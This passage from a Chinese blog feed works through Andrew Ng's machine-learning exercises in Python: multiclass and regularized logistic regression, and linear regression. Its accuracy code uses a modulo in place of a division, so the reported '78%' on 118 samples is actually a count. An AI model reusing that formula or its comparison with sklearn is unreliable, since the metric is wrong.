X.shape[0] params = X.shape[1] # k X (n + 1) array for the parameters of each of the k classifiers # k个分类器的每个参数的k个X (n + 1)数组 all_theta = np.zeros((num_labels, params + 1)) # insert a column of ones at the beginning for the intercept term # 在X的开头插入一列截距项“1” X = np.insert(X, 0, values=np.ones(rows), axis=1) # labels are 1-indexed instead of 0-indexed # 标签是1索引，代替0索引 for i in range(1, num_labels + 1): theta = np.zeros(params + 1) y_i = np.array([1 if label == i else 0 for label in y]) y_i = np.reshape(y_i, (rows, 1)) # 将y_i变成rows行1列的数组 # minimize the objective function # 最小化目标函数 # fun 求最小值的目标函数/代价函数，x0初始化的theta,args常数值,method求极值方法，jac该参数就是计算梯度的函数 fmin = minimize(fun=cost, x0=theta, args=(X, y_i, learning_rate), method='TNC', jac=gradient) all_theta[i-1,:] = fmin.x return all_theta 这里需要注意的几点：首先，我们为theta添加了一个额外的参数（与训练数据一列），以计算截距项（常数项）。 其次，我们将y从类标签转换为每个分类器的二进制值（要么是类i，要么不是类i）。 最后，我们使用SciPy的较新优化API来最小化每个分类器的代价函数。 如果指定的话，API将采用目标函数，初始参数集，优化方法和jacobian（渐变）函数。 然后将优化程序找到的参数分配给参数数组。 实现向量化代码的一个更具挑战性的部分是正确地写入所有的矩阵，保证维度正确。 针对加载的数据集，进行简单的维度分析 12345678910111213rows = data['X'].shape[0] # 行数params = data['X'].shape[1] # 列数all_theta = np.zeros((10, params + 1)) # 10为标签数X = np.insert(data['X'], 0, values=np.ones(rows), axis=1) # 在X第一列前添加一列1theta = np.zeros(params + 1)y_0 = np.array([1 if label == 0 else 0 for label in data['y']])y_0 = np.reshape(y_0, (rows, 1))X.shape, y_0.shape, theta.shape, all_theta.shape ((5000, 401), (5000, 1), (401,), (10, 401))注意，theta是一维数组，因此当它被转换为计算梯度的代码中的矩阵时，它变为（1×401）矩阵。 我们还检查y中的类标签，以确保它们看起来像我们想象的一致。 12#numpy unique（）保留数组中不同的值np.unique(data['y'])#看下有几类标签 array([ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10], dtype=uint8) 利用开始加载的数据集，让我们确保我们的训练函数正确运行，并且得到合理的输出。 12all_theta = one_vs_all(data['X'], data['y'], 10, 1)all_theta array([[-2.38208691e+00, 0.00000000e+00, 0.00000000e+00, ..., 1.30384042e-03, -6.14427666e-10, 0.00000000e+00], [-3.18352842e+00, 0.00000000e+00, 0.00000000e+00, ..., 4.46123909e-03, -5.08642939e-04, 0.00000000e+00], [-4.79735416e+00, 0.00000000e+00, 0.00000000e+00, ..., -2.87309679e-05, -2.47481807e-07, 0.00000000e+00], ..., [-7.98467966e+00, 0.00000000e+00, 0.00000000e+00, ..., -8.97640711e-05, 7.23641521e-06, 0.00000000e+00], [-4.57003568e+00, 0.00000000e+00, 0.00000000e+00, ..., -1.33433208e-03, 1.00011405e-04, 0.00000000e+00], [-5.40502829e+00, 0.00000000e+00, 0.00000000e+00, ..., -1.16485909e-04, 7.85363055e-06, 0.00000000e+00]])我们现在准备好最后一步 - 使用训练完毕的分类器预测每个图像的标签。 对于这一步，我们将计算每个类的类概率，对于每个训练样本（使用当然的向量化代码），并将输出类标签为具有最高概率的类。 进行预测 123456789101112131415161718192021222324252627def predict_all(X, all_theta): rows = X.shape[0] params = X.shape[1] num_labels = all_theta.shape[0] # same as before, insert ones to match the shape # 同样在X的开头插入一列截距项“1” X = np.insert(X, 0, values=np.ones(rows), axis=1) # convert to matrices # 转换为矩阵 X = np.matrix(X) all_theta = np.matrix(all_theta) # compute the class probability for each class on each training instance # 计算每个训练实例上每个类的类概率 h = sigmoid(X * all_theta.T) # create array of the index with the maximum probability # 创建概率最大的索引数组 h_argmax = np.argmax(h, axis=1) # because our array was zero-indexed we need to add one for the true label prediction # 因为我们的数组是零索引的，我们需要为真正的标签预测添加1 h_argmax = h_argmax + 1 return h_argmax 现在我们可以使用predict_all函数为每个实例生成类预测，看看我们的分类器是如何工作的。 1234y_pred = predict_all(data['X'], all_theta)correct = [1 if a == b else 0 for (a, b) in zip(y_pred, data['y'])]accuracy = (sum(map(int, correct)) / float(len(correct)))print ('accuracy = &#123;0&#125;%'.format(accuracy * 100)) accuracy = 94.46%在下一个练习中，我们将介绍如何从头开始实现前馈神经网络。","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"逻辑回归","slug":"逻辑回归","permalink":"https://fishni.github.io/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"}]},{"title":"【吴恩达机器学习】练习2-逻辑回归","slug":"ML-002逻辑回归-Exercise2","date":"2020-06-15T16:00:00.000Z","updated":"2020-07-05T05:10:47.255Z","comments":true,"path":"2020/06/16/ML-002逻辑回归-Exercise2/","link":"","permalink":"https://fishni.github.io/2020/06/16/ML-002%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-Exercise2/","excerpt":"本文主要是：通过练习，了解逻辑回归原理以及 代价函数、梯度下降相关理解，应用到分类任务中，正则化训练算法","text":"本文主要是：通过练习，了解逻辑回归原理以及 代价函数、梯度下降相关理解，应用到分类任务中，正则化训练算法 这个笔记包含了以Python为编程语言的Coursera上机器学习的第二次编程练习。请参考 作业文件 详细描述和方程。在这一次练习中，我们将要实现逻辑回归并且应用到一个分类任务。我们还将通过将正则化加入训练算法，来提高算法的鲁棒性，并用更复杂的情形来测试它。 逻辑回归在训练的初始阶段，我们将要构建一个逻辑回归模型来预测，某个学生是否被大学录取。设想你是大学相关部分的管理者，想通过申请学生两次测试的评分，来决定他们是否被录取。现在你拥有之前申请学生的可以用于训练逻辑回归的训练样本集。对于每一个训练样本，你有他们两次测试的评分和最后是被录取的结果。为了完成这个预测任务，我们准备构建一个可以基于两次测试评分来评估录取可能性的分类模型。 让我们从检查数据开始。 导入相关包 123import numpy as npimport pandas as pdimport matplotlib.pyplot as plt 读取数据，并赋予列属性名 12path = 'ex2data1.txt'data = pd.read_csv(path, header=None, names=['Exam 1', 'Exam 2', 'Admitted']) 查看前五行 1data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Exam 1 Exam 2 Admitted 0 34.623660 78.024693 0 1 30.286711 43.894998 0 2 35.847409 72.902198 0 3 60.182599 86.308552 1 4 79.032736 75.344376 1 创建两个分数的散点图，并使用颜色编码来可视化，如果样本是正的（被接纳）或负的（未被接纳）。 12345678910positive = data[data['Admitted'].isin([1])]negative = data[data['Admitted'].isin([0])]fig, ax = plt.subplots(figsize=(12,8))# 正向类，绘制50个样本，c=‘b’颜色，maker=‘o’绘制的形状ax.scatter(positive['Exam 1'], positive['Exam 2'], s=50, c='b', marker='o', label='Admitted')ax.scatter(negative['Exam 1'], negative['Exam 2'], s=50, c='r', marker='x', label='Not Admitted')ax.legend()# Legend 图例,获取label标签内容，如图右上角显示ax.set_xlabel('Exam 1 Score')ax.set_ylabel('Exam 2 Score')plt.show() 如图：看起来在两类间，有一个清晰的决策边界。现在我们需要实现逻辑回归，那样就可以训练一个模型来预测结果。方程实现在下面的代码示例在”exercises” 文件夹的 “ex2.pdf” 中。 sigmoid 函数g 代表一个常用的逻辑函数（logistic function）为S形函数（Sigmoid function），公式为：$g(z)=\\frac{1}{1+e^{-z}}$合起来，我们得到逻辑回归模型的假设函数： $h_{\\theta}(x)=\\frac{1}{1+e^{-\\theta^Tx}}$ 12def sigmoid(z): return 1 / (1 + np.exp(-z)) 让我们做一个快速的检查，来确保它可以工作。 12345nums = np.arange(-10, 10, step=1)fig, ax = plt.subplots(figsize=(12,8))ax.plot(nums, sigmoid(nums), 'r')plt.show() 棒极了！现在，我们需要编写代价函数来评估结果。代价函数： $J(\\theta) = \\frac{1}{m}\\sum_{i=1}^{m}[-y^{(i)}]log(h_{\\theta}(x^{(i)}))-(1-y^{(i)})log(1-h_{\\theta}(x^{(i)}))]$ 1234567def cost(theta, X, y): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X * theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X * theta.T))) return np.sum(first - second) / (len(X)) 现在，我们要做一些设置，和我们在练习1在线性回归的练习很相似。 123456789101112# add a ones column - this makes the matrix multiplication work out easierdata.insert(0, 'Ones', 1)# set X (training data) and y (target variable)cols = data.shape[1]X = data.iloc[:,0:cols-1]y = data.iloc[:,cols-1:cols]# convert to numpy arrays and initalize the parameter array thetaX = np.array(X.values)y = np.array(y.values)theta = np.zeros(3) 让我们来检查矩阵的维度来确保一切良好。 1theta array([0., 0., 0.])1X.shape, theta.shape, y.shape ((100, 3), (3,), (100, 1))让我们计算初始化参数的代价函数(theta为0)。 1cost(theta, X, y) 0.6931471805599453看起来不错，接下来，我们需要一个函数来计算我们的训练数据、标签和一些参数thata的梯度。 gradient descent(梯度下降) 这是批量梯度下降（batch gradient descent） 转化为向量化计算： $\\frac{1}{m} X^T( Sigmoid(X\\theta) - y )$ {% raw %}$$\\frac{\\partial J( \\theta )}{\\partial {\\theta }_{j}}=\\frac{1}{m}\\sum\\limits_{i=1}^{m}({{h}_{\\theta }}( {x}^{(i)})-{y}^{(i)})x_{j}^{(i)}$$ {% endraw %} 123456789101112131415def gradient(theta, X, y): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) parameters = int(theta.ravel().shape[1]) grad = np.zeros(parameters) error = sigmoid(X * theta.T) - y for i in range(parameters): term = np.multiply(error, X[:,i]) grad[i] = np.sum(term) / len(X) return grad 注意，我们实际上没有在这个函数中执行梯度下降，我们仅仅在计算一个梯度步长。在练习中，一个称为“fminunc”的Octave函数是用来优化函数来计算成本和梯度参数。由于我们使用Python，我们可以用SciPy的“optimize”命名空间来做同样的事情。 我们看看用我们的数据和初始参数为0的梯度下降法的结果。 1gradient(theta, X, y) array([ -0.1 , -12.00921659, -11.26284221])现在可以用SciPy’s truncated newton（TNC）实现寻找最优参数。 123import scipy.optimize as optresult = opt.fmin_tnc(func=cost, x0=theta, fprime=gradient, args=(X, y))result (array([-25.16131872, 0.20623159, 0.20147149]), 36, 0)让我们看看在这个结论下代价函数计算结果是什么个样子~ 1cost(result[0], X, y) 0.20349770158947425接下来，我们需要编写一个函数，用我们所学的参数theta来为数据集X输出预测。然后，我们可以使用这个函数来给我们的分类器的训练精度打分。逻辑回归模型的假设函数： $h_{\\theta}(x)=\\frac{1}{1+e^{-\\theta^Tx}}$ 当${h}_{\\theta}$大于等于0.5时，预测 y=1 当${h}_{\\theta }$小于0.5时，预测 y=0 。 123def predict(theta, X): probability = sigmoid(X * theta.T) return [1 if x &gt;= 0.5 else 0 for x in probability] 12345theta_min = np.matrix(result[0])predictions = predict(theta_min, X)correct = [1 if ((a == 1 and b == 1) or (a == 0 and b == 0)) else 0 for (a, b) in zip(predictions, y)]accuracy = (sum(map(int, correct)) % len(correct))print ('accuracy = &#123;0&#125;%'.format(accuracy)) accuracy = 89%我们的逻辑回归分类器预测正确，如果一个学生被录取或没有录取，达到89%的精确度。不坏！记住，这是训练集的准确性。我们没有保持住了设置或使用交叉验证得到的真实逼近，所以这个数字有可能高于其真实值（这个话题将在以后说明）。 正则化逻辑回归在训练的第二部分，我们将要通过加入正则项提升逻辑回归算法。如果你对正则化有点眼生，或者喜欢这一节的方程的背景，请参考在”exercises”文件夹中的”ex2.pdf”。简而言之，正则化是成本函数中的一个术语，它使算法更倾向于“更简单”的模型（在这种情况下，模型将更小的系数）。这个理论助于减少过拟合，提高模型的泛化能力。这样，我们开始吧。 设想你是工厂的生产主管，你有一些芯片在两次测试中的测试结果。对于这两次测试，你想决定是否芯片要被接受或抛弃。为了帮助你做出艰难的决定，你拥有过去芯片的测试数据集，从其中你可以构建一个逻辑回归模型。 和第一部分很像，从数据可视化开始吧！ 123path = 'ex2data2.txt'data2 = pd.read_csv(path, header=None, names=['Test 1', 'Test 2', 'Accepted'])data2.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Test 1 Test 2 Accepted 0 0.051267 0.69956 1 1 -0.092742 0.68494 1 2 -0.213710 0.69225 1 3 -0.375000 0.50219 1 4 -0.513250 0.46564 1 12345678910positive = data2[data2['Accepted'].isin([1])]negative = data2[data2['Accepted'].isin([0])]fig, ax = plt.subplots(figsize=(12,8))ax.scatter(positive['Test 1'], positive['Test 2'], s=50, c='b', marker='o', label='Accepted')ax.scatter(negative['Test 1'], negative['Test 2'], s=50, c='r', marker='x', label='Rejected')ax.legend()ax.set_xlabel('Test 1 Score')ax.set_ylabel('Test 2 Score')plt.show() 哇，这个数据看起来可比前一次的复杂得多。特别地，你会注意到其中没有线性决策界限，来良好的分开两类数据。一个方法是用像逻辑回归这样的线性技术来构造从原始特征的多项式中得到的特征。让我们通过创建一组多项式特征入手吧。 1234567891011121314degree = 5x1 = data2['Test 1']x2 = data2['Test 2']data2.insert(3, 'Ones', 1)for i in range(1, degree): for j in range(0, i): data2['F' + str(i) + str(j)] = np.power(x1, i-j) * np.power(x2, j)data2.drop('Test 1', axis=1, inplace=True)data2.drop('Test 2', axis=1, inplace=True)data2.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Accepted Ones F10 F20 F21 F30 F31 F32 F40 F41 F42 F43 0 1 1 0.051267 0.002628 0.035864 0.000135 0.001839 0.025089 0.000007 0.000094 0.001286 0.017551 1 1 1 -0.092742 0.008601 -0.063523 -0.000798 0.005891 -0.043509 0.000074 -0.000546 0.004035 -0.029801 2 1 1 -0.213710 0.045672 -0.147941 -0.009761 0.031616 -0.102412 0.002086 -0.006757 0.021886 -0.070895 3 1 1 -0.375000 0.140625 -0.188321 -0.052734 0.070620 -0.094573 0.019775 -0.026483 0.035465 -0.047494 4 1 1 -0.513250 0.263426 -0.238990 -0.135203 0.122661 -0.111283 0.069393 -0.062956 0.057116 -0.051818 现在，我们需要修改第1部分的成本和梯度函数，包括正则化项。首先是成本函数： regularized cost（正则化代价函数）$$J\\left( \\theta \\right)=\\frac{1}{m}\\sum\\limits_{i=1}^{m}{[-{{y}^{(i)}}\\log \\left( {{h}_{\\theta }}\\left( {{x}^{(i)}} \\right) \\right)-\\left( 1-{{y}^{(i)}} \\right)\\log \\left( 1-{{h}_{\\theta }}\\left( {{x}^{(i)}} \\right) \\right)]}+\\frac{\\lambda }{2m}\\sum\\limits_{j=1}^{n}{\\theta _{j}^{2}}$$ 12345678def costReg(theta, X, y, learningRate): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X * theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X * theta.T))) reg = (learningRate / (2 * len(X))) * np.sum(np.power(theta[:,1:theta.shape[1]], 2)) return np.sum(first - second) / len(X) + reg 请注意等式中的”reg” 项。还注意到另外的一个“学习率”参数。这是一种超参数，用来控制正则化项。现在我们需要添加正则化梯度函数： 如果我们要使用梯度下降法令这个代价函数最小化，因为我们未对${\\theta }_{0}$ 进行正则化，所以梯度下降算法将分两种情形： $Repeat$ $until$ $convergence${ ​ ${\\theta_0}:={\\theta_0}-a\\frac{1}{m}\\sum\\limits_{i=1}^{m}{(({h_\\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{0}^{(i)}})$ ​ ${\\theta_j}:={\\theta_j}-a[\\frac{1}{m}\\sum\\limits_{i=1}^{m}{({h_\\theta}({{x}^{(i)}})-{{y}^{(i)}})x_{j}^{\\left( i \\right)}}+\\frac{\\lambda }{m}{\\theta_j}]$ ​ $for$ $j=1,2,...n$ ​ } 对上面的算法中 j=1,2,…,n 时的更新式子进行调整可得： ${{\\theta }_{j}}:={{\\theta }_{j}}(1-a\\frac{\\lambda }{m})-a\\frac{1}{m}\\sum\\limits_{i=1}^{m}{({{h}_{\\theta }}\\left( {{x}^{(i)}} \\right)-{{y}^{(i)}})x_{j}^{(i)}}$ 12345678910111213141516171819def gradientReg(theta, X, y, learningRate): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) parameters = int(theta.ravel().shape[1]) grad = np.zeros(parameters) error = sigmoid(X * theta.T) - y for i in range(parameters): term = np.multiply(error, X[:,i]) if (i == 0): grad[i] = np.sum(term) / len(X) else: grad[i] = (np.sum(term) / len(X)) + ((learningRate / len(X)) * theta[:,i]) return grad 就像在第一部分中做的一样，初始化变量。 123456789# set X and y (remember from above that we moved the label to column 0)cols = data2.shape[1]X2 = data2.iloc[:,1:cols]y2 = data2.iloc[:,0:1]# convert to numpy arrays and initalize the parameter array thetaX2 = np.array(X2.values)y2 = np.array(y2.values)theta2 = np.zeros(11) 让我们初始学习率到一个合理值。，果有必要的话（即如果惩罚太强或不够强）,我们可以之后再折腾这个。 1learningRate = 1 现在，让我们尝试调用新的默认为0的theta的正则化函数，以确保计算工作正常。 1costReg(theta2, X2, y2, learningRate) 0.69314718055994541gradientReg(theta2, X2, y2, learningRate) array([0.00847458, 0.01878809, 0.05034464, 0.01150133, 0.01835599, 0.00732393, 0.00819244, 0.03934862, 0.00223924, 0.01286005, 0.00309594])现在我们可以使用和第一部分相同的优化函数来计算优化后的结果。 12result2 = opt.fmin_tnc(func=costReg, x0=theta2, fprime=gradientReg, args=(X2, y2, learningRate))result2 (array([ 0.53010249, 0.29075567, -1.60725764, -0.5821382 , 0.01781027, -0.21329508, -0.40024142, -1.37144139, 0.02264303, -0.9503358 , 0.0344085 ]), 22, 1)最后，我们可以使用第1部分中的预测函数来查看我们的方案在训练数据上的准确度。 12345theta_min = np.matrix(result2[0])predictions = predict(theta_min, X2)correct = [1 if ((a == 1 and b == 1) or (a == 0 and b == 0)) else 0 for (a, b) in zip(predictions, y2)]accuracy = (sum(map(int, correct)) % len(correct))print ('accuracy = &#123;0&#125;%'.format(accuracy)) accuracy = 78%虽然我们实现了这些算法，值得注意的是，我们还可以使用高级Python库像scikit-learn来解决这个问题。 123from sklearn import linear_model#调用sklearn的线性回归包model = linear_model.LogisticRegression(penalty='l2', C=1.0)model.fit(X2, y2.ravel()) LogisticRegression(C=1.0, class_weight=None, dual=False, fit_intercept=True, intercept_scaling=1, l1_ratio=None, max_iter=100, multi_class=&apos;warn&apos;, n_jobs=None, penalty=&apos;l2&apos;, random_state=None, solver=&apos;warn&apos;, tol=0.0001, verbose=0, warm_start=False)1model.score(X2, y2) 0.6610169491525424这个准确度和我们刚刚实现的差了好多，不过请记住这个结果可以使用默认参数下计算的结果。我们可能需要做一些参数的调整来获得和我们之前结果相同的精确度。 这就是练习2的全部！ 敬请期待下一个练习：多类图像分类。","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"逻辑回归","slug":"逻辑回归","permalink":"https://fishni.github.io/tags/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"}]},{"title":"【吴恩达机器学习】练习1-线性回归","slug":"ML-001线性回归-Exercise1","date":"2020-06-09T16:00:00.000Z","updated":"2020-07-02T16:30:10.356Z","comments":true,"path":"2020/06/10/ML-001线性回归-Exercise1/","link":"","permalink":"https://fishni.github.io/2020/06/10/ML-001%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92-Exercise1/","excerpt":"本文主要是：通过练习，了解线性回归原理以及 代价函数、梯度下降相关理解","text":"本文主要是：通过练习，了解线性回归原理以及 代价函数、梯度下降相关理解 作业内容在根目录： 作业文件 单变量线性回归 导入相关包 123import numpy as npimport pandas as pdimport matplotlib.pyplot as plt 读取数据并赋予列名 12path = 'ex1data1.txt'data = pd.read_csv(path, header=None, names=['Population', 'Profit']) 查看前五行 1data.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Population Profit 0 6.1101 17.5920 1 5.5277 9.1302 2 8.5186 13.6620 3 7.0032 11.8540 4 5.8598 6.8233 查看数据信息 1data.info &lt;bound method DataFrame.info of Population Profit 0 6.1101 17.59200 1 5.5277 9.13020 2 8.5186 13.66200 3 7.0032 11.85400 4 5.8598 6.82330 .. ... ... 92 5.8707 7.20290 93 5.3054 1.98690 94 8.2934 0.14454 95 13.3940 9.05510 96 5.4369 0.61705 [97 rows x 2 columns]&gt; 查看数据的均值、标准差等信息 1data.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Population Profit count 97.000000 97.000000 mean 8.159800 5.839135 std 3.869884 5.510262 min 5.026900 -2.680700 25% 5.707700 1.986900 50% 6.589400 4.562300 75% 8.578100 7.046700 max 22.203000 24.147000 画图，观察数据分布状态 123# 散点图data.plot(kind='scatter', x='Population', y='Profit', figsize=(12,8))plt.show() 代价函数现在让我们使用梯度下降来实现线性回归，以最小化成本函数。 以下代码示例中实现的方程在“练习”文件夹中的“ex1.pdf”中有详细说明。 首先，我们将创建一个以参数θ为特征函数的代价函数$$J(\\theta)=\\frac{1}{2m}\\sum\\limits_{i=1}^{m}(h_{\\theta}(x^{(i)}-y^{(i)})^2$$其中：$h_{\\theta}(x) = {\\theta}^X={\\theta}_0 x_0+{\\theta}_1 x_1+ {\\theta}_2 x_2+…+{\\theta}_n x_n$ 代价函数代码 123def computeCost(X, y, theta): inner = np.power(((X * theta.T) - y), 2) return np.sum(inner) / (2 * len(X)) 让我们在训练集中添加一列，以便我们可以使用向量化的解决方案来计算代价和梯度。 1data.insert(0, 'Ones', 1) 1data.insert(1, 'Twos', 1) 1data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ones Twos Population Profit 0 1 1 6.1101 17.59200 1 1 1 5.5277 9.13020 2 1 1 8.5186 13.66200 3 1 1 7.0032 11.85400 4 1 1 5.8598 6.82330 ... ... ... ... ... 92 1 1 5.8707 7.20290 93 1 1 5.3054 1.98690 94 1 1 8.2934 0.14454 95 1 1 13.3940 9.05510 96 1 1 5.4369 0.61705 97 rows × 4 columns 删除多添加的列 用法：DataFrame.drop(labels=None,axis=0, index=None, columns=None, inplace=False) 参数说明： labels 就是要删除的行列的名字，用列表给定 axis 默认为0，指删除行，因此删除columns时要指定axis=1； index 直接指定要删除的行 columns 直接指定要删除的列 inplace=False，默认该删除操作不改变原数据，而是返回一个执行删除操作后的新dataframe； inplace=True，则会直接在原数据上进行删除操作，删除后无法返回。 因此，删除行列有两种方式：1）labels=None,axis=0 的组合2）index或columns直接指定要删除的行或列 1data.drop(['Twos'],axis=1,inplace=True) 1data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ones Population Profit 0 1 6.1101 17.59200 1 1 5.5277 9.13020 2 1 8.5186 13.66200 3 1 7.0032 11.85400 4 1 5.8598 6.82330 ... ... ... ... 92 1 5.8707 7.20290 93 1 5.3054 1.98690 94 1 8.2934 0.14454 95 1 13.3940 9.05510 96 1 5.4369 0.61705 97 rows × 3 columns 现在我们来做一些变量初始化。 1234# set X (training data训练数据集) and y (target variable目标变量)cols = data.shape[1]X = data.iloc[:,0:cols-1]#X是所有行，去掉最后一列y = data.iloc[:,cols-1:cols]#y是所有行，取最后一列 观察下 X (训练集) and y (目标变量)是否正确. 1X.head()#head()是观察前5行 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Ones Population 0 1 6.1101 1 1 5.5277 2 1 8.5186 3 1 7.0032 4 1 5.8598 1y.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Profit 0 17.5920 1 9.1302 2 13.6620 3 11.8540 4 6.8233 代价函数是应该是numpy矩阵，所以我们需要转换X和Y，然后才能使用它们。 我们还需要初始化theta。 123X = np.matrix(X.values)y = np.matrix(y.values)theta = np.matrix(np.array([0,0])) theta 是一个(1,2)矩阵 1theta matrix([[0, 0]]) 查看维度 1X.shape, theta.shape, y.shape ((97, 2), (1, 2), (97, 1)) 计算代价函数 (theta初始值为0). 1computeCost(X, y, theta) 32.072733877455676batch gradient decent（批量梯度下降）$$ \\theta_j:=\\theta_j- \\alpha \\frac{\\partial J(\\theta)}{\\partial \\theta_j} $$ 12345678910111213141516def gradientDescent(X, y, theta, alpha, iters): temp = np.matrix(np.zeros(theta.shape))# 初始化theta.shape维的0向量 parameters = int(theta.ravel().shape[1]) cost = np.zeros(iters)# 迭代次数 # for i in range(iters): error = (X * theta.T) - y for j in range(parameters): term = np.multiply(error, X[:,j]) temp[0,j] = theta[0,j] - ((alpha / len(X)) * np.sum(term)) theta = temp cost[i] = computeCost(X, y, theta) return theta, cost 初始化一些附加变量 - 学习速率α和要执行的迭代次数。 12alpha = 0.01iters = 1000 现在让我们运行梯度下降算法来将我们的参数θ适合于训练集。 12g, cost = gradientDescent(X, y, theta, alpha, iters)g matrix([[-3.24140214, 1.1272942 ]]) 最后，我们可以使用我们拟合的参数计算训练模型的代价函数（误差）。 1computeCost(X, y, g) 4.515955503078912 现在我们来绘制线性模型以及数据，直观地看出它的拟合。 1234567891011x = np.linspace(data.Population.min(), data.Population.max(), 100)# 返回均匀间隔的100个数f = g[0, 0] + (g[0, 1] * x)fig, ax = plt.subplots(figsize=(12,8))ax.plot(x, f, 'r', label='Prediction')ax.scatter(data.Population, data.Profit, label='Traning Data')ax.legend(loc=2)ax.set_xlabel('Population')ax.set_ylabel('Profit')ax.set_title('Predicted Profit vs. Population Size')plt.show() 由于梯度方程式函数也在每个训练迭代中输出一个代价的向量，所以我们也可以绘制。 请注意，代价总是降低 - 这是凸优化问题的一个例子。 123456fig, ax = plt.subplots(figsize=(12,8))ax.plot(np.arange(iters), cost, 'r')ax.set_xlabel('Iterations')ax.set_ylabel('Cost')ax.set_title('Error vs. Training Epoch')plt.show() 多变量线性回归练习1还包括一个房屋价格数据集，其中有2个变量（房子的大小，卧室的数量）和目标（房子的价格）。 我们使用我们已经应用的技术来分析数据集。 123path = 'ex1data2.txt'data2 = pd.read_csv(path, header=None, names=['Size', 'Bedrooms', 'Price'])data2.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Size Bedrooms Price 0 2104 3 399900 1 1600 3 329900 2 2400 3 369000 3 1416 2 232000 4 3000 4 539900 对于此任务，我们添加了另一个预处理步骤 - 特征归一化。 这个对于pandas来说很简单 12data2 = (data2 - data2.mean()) / data2.std()data2.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Size Bedrooms Price 0 0.130010 -0.223675 0.475747 1 -0.504190 -0.223675 -0.084074 2 0.502476 -0.223675 0.228626 3 -0.735723 -1.537767 -0.867025 4 1.257476 1.090417 1.595389 现在我们重复第1部分的预处理步骤，并对新数据集运行线性回归程序。 123456789101112131415161718# add ones columndata2.insert(0, 'Ones', 1)# set X (training data) and y (target variable)cols = data2.shape[1]X2 = data2.iloc[:,0:cols-1]y2 = data2.iloc[:,cols-1:cols]# convert to matrices and initialize thetaX2 = np.matrix(X2.values)y2 = np.matrix(y2.values)theta2 = np.matrix(np.array([0,0,0]))# perform linear regression on the data setg2, cost2 = gradientDescent(X2, y2, theta2, alpha, iters)# get the cost (error) of the modelcomputeCost(X2, y2, g2) 0.1307033696077189我们也可以快速查看这一个的训练进程。 123456fig, ax = plt.subplots(figsize=(12,8))ax.plot(np.arange(iters), cost2, 'r')ax.set_xlabel('Iterations')ax.set_ylabel('Cost')ax.set_title('Error vs. Training Epoch')plt.show() 我们也可以使用scikit-learn的线性回归函数，而不是从头开始实现这些算法。 我们将scikit-learn的线性回归算法应用于第1部分的数据，并看看它的表现。 123from sklearn import linear_modelmodel = linear_model.LinearRegression()model.fit(X, y) LinearRegression(copy_X=True, fit_intercept=True, n_jobs=None, normalize=False)scikit-learn model的预测表现 1234567891011x = np.array(X[:, 1].A1)f = model.predict(X).flatten()fig, ax = plt.subplots(figsize=(12,8))ax.plot(x, f, 'r', label='Prediction')ax.scatter(data.Population, data.Profit, label='Traning Data')ax.legend(loc=2)ax.set_xlabel('Population')ax.set_ylabel('Profit')ax.set_title('Predicted Profit vs. Population Size')plt.show() normal equation（正规方程）正规方程是通过求解下面的方程来找出使得代价函数最小的参数的：$ \\frac{\\partial J(\\theta_j) }{\\partial \\theta_j}=0 $。 假设我们的训练集特征矩阵为 X（包含了$x_0=1$并且我们的训练集结果为向量 y，则利用正规方程解出向量 $\\theta =(X^TX)^{-1}X^Ty$。上标T代表矩阵转置，上标-1 代表矩阵的逆。设矩阵$A=X^TX$，则：$(X^TX)^{-1}=A^{-1}$ 梯度下降与正规方程的比较： 梯度下降：需要选择学习率α，需要多次迭代，当特征数量n大时也能较好适用，适用于各种类型的模型 正规方程：不需要选择学习率α，一次计算得出，需要计算$(X^TX)^{-1}$，如果特征数量n较大则运算代价大，因为矩阵逆的计算时间复杂度为$O(n3)$，通常来说当$n$小于10000 时还是可以接受的，只适用于线性模型，不适合逻辑回归模型等其他模型 1234# 正规方程def normalEqn(X, y): theta = np.linalg.inv(X.T@X)@X.T@y#X.T@X等价于X.T.dot(X) return theta 12final_theta2=normalEqn(X, y)#感觉和批量梯度下降的theta的值有点差距final_theta2 matrix([[-3.89578088], [ 